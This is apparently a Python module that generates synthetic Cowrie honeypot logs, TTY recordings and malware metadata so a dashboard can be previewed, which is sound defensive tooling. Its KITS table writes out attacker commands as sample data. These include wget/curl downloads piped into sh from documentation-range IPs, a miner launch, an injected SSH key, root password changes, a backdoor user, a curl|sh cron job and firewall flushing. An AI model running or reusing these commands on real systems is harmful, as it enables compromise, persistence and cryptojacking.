"""Synthetic Cowrie logs for previewing the dashboard before real data exists.

The output follows Cowrie 3.x's JSON event format and TTY recording format, so
it exercises the exact same ingest path as production logs. Malware URLs use
the RFC 5737 documentation ranges, hashes and detections are made up: nothing
here points at a real host or file. Pages built from it are flagged "demo" and
the dashboard says so loudly.
"""
from __future__ import annotations

import datetime as dt
import hashlib
import json
import random
from pathlib import Path

from . import tty

USERS = ["root"] * 14 + ["admin"] * 4 + [
    "ubuntu", "user", "test", "oracle", "postgres", "pi", "git", "ftpuser", "guest",
    "support", "deploy", "hadoop", "mysql", "debian", "ubnt", "minecraft", "sol", "solana",
    "validator", "docker", "jenkins", "tomcat", "elastic", "steam", "nginx",
]
PASSWORDS = ["123456"] * 6 + ["password"] * 3 + ["admin"] * 3 + ["root"] * 2 + [
    "12345678", "123456789", "1234", "12345", "qwerty", "123", "test", "1qaz2wsx", "P@ssw0rd",
    "admin123", "toor", "raspberry", "ubnt", "changeme", "abc123", "password123", "111111",
    "000000", "1q2w3e4r", "default", "Passw0rd!", "root123", "3245gs5662d34", "user", "guest",
    "oracle", "", "qwe123", "Aa123456", "welcome1", "solana", "validator",
]
CLIENTS = ["SSH-2.0-Go"] * 8 + ["SSH-2.0-libssh_0.10.6"] * 3 + ["SSH-2.0-libssh2_1.11.0"] * 2 + [
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-PuTTY_Release_0.80",
    "SSH-2.0-ZGrab ZGrab SSH Survey", "SSH-2.0-Nmap-SSH2-Hostkey", "SSH-2.0-AsyncSSH_2.14.2",
]
MOTD = ("\nThe programs included with the Debian GNU/Linux system are free software;\n"
        "the exact distribution terms for each program are described in the\n"
        "individual files in /usr/share/doc/*/copyright.\n\n"
        "Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\n")

# Command kits: each bot replays one script, which is what campaigns are made of.
# kit: (protocol, mode, commands, downloads); mode "exec" = SSH exec channel, "typed" = slow, char by char.
KITS = {
    "recon-uname": ("ssh", "exec", ["uname -s -v -n -r -m"], []),
    "recon-env": ("ssh", "exec", [
        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; "
        "uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); echo \"$uname|$arch\""], []),
    "outlaw": ("ssh", "shell", [
        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ-demo-key mdrfckr\""
        ">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
        "cat /proc/cpuinfo | grep name | wc -l", "uname -a", "whoami", "crontab -l"], []),
    "mirai-ecchi": ("telnet", "shell", [
        "enable", "system", "shell", "sh", "/bin/busybox ECCHI",
        "cd /tmp || cd /var/run || cd /mnt; wget http://203.0.113.45/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf *"],
        ["http://203.0.113.45/bins.sh"]),
    "mirai-hisilicon": ("telnet", "shell", [
        "sh", "shell", "enable", "system", "ping; sh", "/bin/busybox HISILICON",
        "/bin/busybox cat /proc/self/exe || cat /proc/self/exe"], []),
    "xmrig": ("ssh", "shell", [
        "uname -a", "nproc",
        "curl -s http://198.51.100.23/x/xmrig -o /tmp/.x && chmod +x /tmp/.x && "
        "/tmp/.x -o stratum+tcp://pool.example.net:3333", "history -c"], ["http://198.51.100.23/x/xmrig"]),
    "redtail": ("ssh", "shell", [
        "wget http://198.51.100.40/redtail.x86_64 -O .redtail; chmod +x .redtail; ./.redtail ssh",
        "rm -rf .redtail"], ["http://198.51.100.40/redtail.x86_64"]),
    "kinsing-ish": ("ssh", "typed", ["w", "wget -q http://192.0.2.77/.s/k.sh -O- | sh"], ["http://192.0.2.77/.s/k.sh"]),
    "persist": ("ssh", "shell", [
        "echo \"root:Xk29fLq7\"|chpasswd|bash", "useradd -m -s /bin/bash sysadm; echo 'sysadm:Qwe!2024'|chpasswd",
        "(crontab -l; echo '*/5 * * * * curl -fsSL http://203.0.113.9/c.sh|sh') | crontab -",
        "systemctl stop firewalld; iptables -F"], ["http://203.0.113.9/c.sh"]),
    "busybox-check": ("telnet", "shell", ["enable", "linuxshell", "system", "shell", "sh"], []),
}
KIT_WEIGHTS = {"recon-uname": 30, "recon-env": 6, "outlaw": 8, "mirai-ecchi": 10, "mirai-hisilicon": 8,
               "xmrig": 4, "redtail": 3, "kinsing-ish": 2, "persist": 3, "busybox-check": 6}
FAILED_URLS = ["http://192.0.2.200/x86_64", "http://192.0.2.200/arm7", "http://203.0.113.45/bins/mips"]

# Synthetic analyzer output per downloaded URL (see sensor/shipper.py for the real one).
SAMPLES = {
    "http://203.0.113.45/bins.sh": {"kind": "script", "size": 1460, "script": {
        "shebang": "#!/bin/sh", "lines": 24,
        "urls": [f"http://203.0.113.45/bins/{a}" for a in ("x86", "arm", "arm7", "mips", "mpsl", "ppc", "m68k")],
        "archs": ["x86", "arm", "arm7", "mips", "mpsl", "ppc", "m68k"]}, "hints": ["busybox", "mirai"]},
    "http://198.51.100.23/x/xmrig": {"kind": "elf", "size": 6_123_520, "packer": "UPX", "elf": {
        "bits": 64, "endian": "little", "machine": "x86-64", "machine_id": 62, "type": "EXEC",
        "static": True, "stripped": True, "interp": None}, "hints": ["xmrig"]},
    "http://198.51.100.40/redtail.x86_64": {"kind": "elf", "size": 1_934_224, "elf": {
        "bits": 64, "endian": "little", "machine": "x86-64", "machine_id": 62, "type": "DYN",
        "static": False, "stripped": True, "interp": "/lib64/ld-linux-x86-64.so.2"}, "hints": []},
    "http://192.0.2.77/.s/k.sh": {"kind": "script", "size": 3311, "script": {
        "shebang": "#!/bin/bash", "lines": 88, "urls": ["http://192.0.2.77/.s/kinsing"], "archs": []},
        "hints": []},
    "http://203.0.113.9/c.sh": {"kind": "script", "size": 212, "script": {
        "shebang": "#!/bin/sh", "lines": 5, "urls": ["http://203.0.113.9/arm7"], "archs": ["arm7"]},
        "hints": []},
}
DETECTIONS = {"http://203.0.113.45/bins.sh": ("trojan.mirai/shell", "Mirai"),
              "http://198.51.100.23/x/xmrig": ("riskware.xmrig/coinminer", "CoinMiner")}

PROMPT = {"root": "root@srv-db01:~# "}
REPLIES = {
    "uname -a": "Linux srv-db01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\n",
    "uname -s -v -n -r -m": "Linux srv-db01 5.15.0-91-generic #101-Ubuntu SMP x86_64\n",
    "nproc": "2\n", "whoami": "root\n", "w": " 07:41:02 up 12 days,  3:12,  1 user,  load average: 0.08, 0.03, 0.01\n",
    "cat /proc/cpuinfo | grep name | wc -l": "2\n", "crontab -l": "no crontab for root\n",
}


def _public_ip(rng: random.Random) -> str:
    reserved = {0, 10, 100, 127, 169, 172, 192, 198, 203}
    while True:
        first = rng.randint(1, 223)
        if first not in reserved:
            return f"{first}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def _hassh(client: str) -> str:
    return hashlib.md5(client.encode()).hexdigest()


def _sha(url: str, variant: int) -> str:
    return hashlib.sha256(f"{url}:{variant}".encode()).hexdigest()


def _reply(command: str, user: str) -> str:
    if command in REPLIES:
        return REPLIES[command]
    if command.startswith("/bin/busybox ") and command.split()[1].isupper():
        return f"{command.split()[1]}: applet not found\n"
    if "/proc/self/exe" in command:
        return "\x7fELF\x01\x01\x01" + "\x00" * 40 + "\x02\x00\x28\x00" + "\x00" * 30 + ".shstrtab.text" + "\x00" * 24 + "\n"
    if command in ("enable", "system", "shell", "linuxshell", "ping; sh"):
        return f"-bash: {command.split(';')[0]}: command not found\n"
    return ""


class _Recorder:
    """Writes recordings the way Cowrie does: one file per distinct input."""

    def __init__(self, tty_dir: Path) -> None:
        self.dir = tty_dir
        self.sizes: dict[str, int] = {}

    def record(self, rng: random.Random, kit: str, user: str, start: dt.datetime) -> tuple[str, int, bool, float]:
        protocol, mode, commands, _urls = KITS[kit]
        key = hashlib.sha256(f"{kit}\n{user}\n".encode() + "\n".join(commands).encode()).hexdigest()
        t = start.timestamp()
        records = [(tty.OP_OPEN, 0, t, b"")]
        if mode == "exec":
            for command in commands:
                t += 0.05
                records.append((tty.OP_WRITE, tty.DIR_INTERACT, t, command.encode()))
        else:
            prompt = PROMPT.get(user, f"{user}@srv-db01:~$ ")
            t += 0.02
            records.append((tty.OP_WRITE, tty.DIR_OUTPUT, t, (MOTD + prompt).encode()))
            for command in commands:
                t += rng.uniform(0.1, 0.6)
                records.append((tty.OP_WRITE, tty.DIR_INPUT, t, command.encode() + b"\x00"))
                # Echo char by char: instant for bots, at human speed for the "typed" kit.
                for ch in command:
                    t += rng.uniform(0.04, 0.12) if mode == "typed" else 0.0004
                    records.append((tty.OP_WRITE, tty.DIR_OUTPUT, t, ch.encode()))
                t += 0.01
                records.append((tty.OP_WRITE, tty.DIR_OUTPUT, t, ("\n" + _reply(command, user) + prompt).encode()))
        records.append((tty.OP_CLOSE, 0, t + 0.05, b""))
        duplicate = key in self.sizes
        if not duplicate:
            data = tty.encode(records)
            self.dir.mkdir(parents=True, exist_ok=True)
            (self.dir / key).write_bytes(data)
            self.sizes[key] = sum(len(r[3]) for r in records if r[1] == tty.DIR_OUTPUT)
        return key, self.sizes[key], duplicate, t - start.timestamp()


def generate(out_dir: Path, days: int = 45, seed: int = 7, today: dt.date | None = None) -> list[Path]:
    """Write cowrie.json.YYYY-MM-DD files for the last `days` days; returns their paths.

    Recordings go to out_dir/tty/<sha256>, analyzer metadata to out_dir/malware/<sha256>.json."""
    rng = random.Random(seed)
    today = today or dt.datetime.now(dt.timezone.utc).date()
    out_dir.mkdir(parents=True, exist_ok=True)
    recorder = _Recorder(out_dir / "tty")
    kits = list(KIT_WEIGHTS)
    weights = [KIT_WEIGHTS[k] for k in kits]
    # Recurring actors produce the "top IPs"; one-off scanners make up the long tail.
    actors = [(_public_ip(rng), rng.choice(["brute", "brute", "loader", "scan"]), rng.choices(kits, weights)[0])
              for _ in range(40)]
    files, samples = [], {}
    for offset in range(days - 1, -1, -1):
        day = today - dt.timedelta(days=offset)
        age = days - offset                       # sensor gets discovered within a few days
        base = 900 * min(1.0, 0.25 + age / 6) * (1.15 if day.weekday() < 5 else 0.9)
        n_sessions = int(base * rng.uniform(0.75, 1.3) * (0.35 if offset == 0 else 1))
        # A campaign that only started recently, so "new" shows up in the 7-day window.
        active_kits = [k for k in kits if k != "redtail" or offset < 5]
        active_weights = [KIT_WEIGHTS[k] for k in active_kits]
        events = []
        for _ in range(n_sessions):
            if rng.random() < 0.55:
                ip, kind, kit = rng.choice(actors)
            else:
                ip, kind = _public_ip(rng), rng.choice(["scan", "scan", "brute", "brute", "loader"])
                kit = rng.choices(active_kits, active_weights)[0]
            if kit == "redtail" and offset >= 5:
                kit = "outlaw"
            hour = rng.choices(range(24), weights=[1 + (h in (2, 3, 4, 14, 15)) * 0.8 for h in range(24)])[0]
            if offset == 0:
                hour = hour * 9 // 24              # today is only partly over
            start = dt.datetime.combine(day, dt.time(hour), dt.timezone.utc) + dt.timedelta(
                seconds=rng.randint(0, 3599))
            events += _session(rng, ip, kind, kit, start, recorder, samples)
        events.sort(key=lambda e: e["timestamp"])
        path = out_dir / f"cowrie.json.{day.isoformat()}"
        path.write_text("".join(json.dumps(e) + "\n" for e in events), encoding="utf-8")
        files.append(path)
    _write_samples(out_dir / "malware", samples)
    return files


def _write_samples(malware_dir: Path, samples: dict[str, tuple[str, str]]) -> None:
    malware_dir.mkdir(parents=True, exist_ok=True)
    for old in malware_dir.glob("*.json"):
        old.unlink()
    for sha, (url, first_seen) in sorted(samples.items()):
        base = SAMPLES.get(url, {"kind": "empty", "size": 0})
        meta = {"v": 1, "sha256": sha, "size": base["size"], "first_seen": first_seen[:19] + "Z",
                "kind": base["kind"], "magic": "7f454c46" if base["kind"] == "elf" else "23212f62",
                "elf": base.get("elf"), "packer": base.get("packer"), "script": base.get("script"),
                "hints": base.get("hints", []), "intel": None}
        if url in DETECTIONS:
            label, signature = DETECTIONS[url]
            meta["intel"] = {"checked_at": first_seen[:19] + "Z",
                             "vt": {"malicious": 30 + int(sha[:2], 16) % 30, "total": 72, "label": label},
                             "mb": {"signature": signature, "tags": ["elf" if base["kind"] == "elf" else "sh",
                                                                     signature.lower()]}}
        (malware_dir / f"{sha}.json").write_text(json.dumps(meta, indent=1, sort_keys=True), encoding="utf-8")


def _session(rng: random.Random, ip: str, kind: str, kit: str, start: dt.datetime,
             recorder: _Recorder, samples: dict) -> list[dict]:
    kit_protocol, mode, kit_commands, kit_urls = KITS[kit]
    loader = kind == "loader"
    protocol = kit_protocol if loader else ("telnet" if rng.random() < 0.14 else "ssh")
    sid = "%012x" % rng.getrandbits(48)
    clock = [start]
    base = {"session": sid, "protocol": protocol, "src_ip": ip, "src_port": rng.randint(1024, 65535),
            "dst_ip": "10.42.0.4", "dst_port": 2222 if protocol == "ssh" else 2223,
            "sensor": "azure-demo"}

    def event(eventid: str, **fields) -> dict:
        clock[0] += dt.timedelta(milliseconds=rng.randint(40, 1500))
        return {**base, **fields, "eventid": eventid,
                "timestamp": clock[0].strftime("%Y-%m-%dT%H:%M:%S.%fZ")}

    out = [event("cowrie.session.connect")]
    if protocol == "ssh":
        client = rng.choice(CLIENTS)
        out.append(event("cowrie.client.version", version=client))
        out.append(event("cowrie.client.kex", hassh=_hassh(client)))
    if kind != "scan":
        tries = rng.randint(1, 6) if kind == "brute" else rng.randint(1, 2)
        for i in range(tries):
            user = rng.choice(USERS) if kind == "brute" else rng.choice(["root", "admin", "root"])
            password = rng.choice(PASSWORDS)
            # Cowrie's default user db accepts root with almost any password.
            ok = (loader and i == tries - 1) or (user == "root" and password not in ("root", "123456")
                                                 and rng.random() < 0.2)
            out.append(event("cowrie.login.success" if ok else "cowrie.login.failed",
                             username=user, password=password))
            if ok:
                session_kit = kit if loader else ("recon-uname" if protocol == "ssh" else "busybox-check")
                commands = KITS[session_kit][2]
                tty_start = clock[0]
                for command in commands:
                    out.append(event("cowrie.command.input", input=command))
                for url in KITS[session_kit][3]:
                    if rng.random() < 0.15:
                        out.append(event("cowrie.session.file_download.failed", url=rng.choice(FAILED_URLS)))
                        continue
                    sha = _sha(url, rng.randint(0, 2))
                    samples.setdefault(sha, (url, clock[0].strftime("%Y-%m-%dT%H:%M:%S")))
                    out.append(event("cowrie.session.file_download", url=url, shasum=sha,
                                     outfile=f"var/lib/cowrie/downloads/{sha}"))
                sha, size, duplicate, seconds = recorder.record(rng, session_kit, user, tty_start)
                clock[0] = max(clock[0], tty_start + dt.timedelta(seconds=seconds))
                out.append(event("cowrie.log.closed", ttylog=f"var/lib/cowrie/tty/{sha}", size=size,
                                 shasum=sha, duplicate=duplicate, duration_ms=int(seconds * 1000)))
                break
    out.append(event("cowrie.session.closed",
                     duration_ms=int((clock[0] - start).total_seconds() * 1000)))
    return out
